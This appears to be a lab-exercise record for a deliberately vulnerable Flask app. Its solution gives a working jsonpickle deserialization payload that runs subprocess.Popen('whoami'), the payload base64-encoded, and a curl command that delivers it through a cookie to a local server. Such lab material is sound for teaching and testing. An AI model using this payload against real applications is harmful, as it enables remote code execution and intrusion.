{"description":"Flask App vulnerable to Insecure Deserialization \nhttps://hub.docker.com/r/dockerbucket/insecure_deserialization","goal":"<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>","solution":"<p><a href=\"https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/\">https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/</a></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>Application contains a vulnerability in / endpoint:</p>\n<p><img src=\"https://i.imgur.com/08f3MPY.png\" alt=\"\" width=\"709\" height=\"667\" /></p>\n<p>jsonpickle.decode is called without checking. username parameter is rendered in render_template.</p>\n<p>Convert the following PoC code in base64:</p>\n<div><em>{\"py/object\": \"__main__.Shell\", \"py/reduce\": [{\"py/type\": \"subprocess.Popen\"}, {\"py/tuple\": [\"whoami\"]}, null, null, null]}</em><br /><br /><em>-&gt; eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6ICJzdWJwcm9jZXNzLlBvcGVuIn0sIHsicHkvdHVwbGUiOiBbIndob2FtaSJdfSwgbnVsbCwgbnVsbCwgbnVsbF19Cg==</em><br /><br />Send the request: <br /><br /><br /></div>\n<div><em>curl&nbsp; --cookie \"username=eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6ICJzdWJwcm9jZXNzLlBvcGVuIn0sIHsicHkvdHVwbGUiOiBbIndob2FtaSJdfSwgbnVsbCwgbnVsbCwgbnVsbF19Cg==\" <a href=\"http://127.0.0.1:3000/\">http://127.0.0.1:3000/</a>&nbsp; </em></div>\n<div>&nbsp;</div>\n<div>&nbsp;</div>\n<div>If you look at server logs:</div>\n<div><img src=\"https://i.imgur.com/eU3oEQP.png\" alt=\"\" width=\"1723\" height=\"112\" /></div>\n<div>&nbsp;</div>\n<div>It is possible to observer that \"whoami\" command is called:</div>\n<div><img src=\"https://i.imgur.com/3EpOK7l.png\" alt=\"\" /></div>\n<div>&nbsp;</div>\n<div>&nbsp;</div>\n<div>&nbsp;</div>","author":"dsp"}
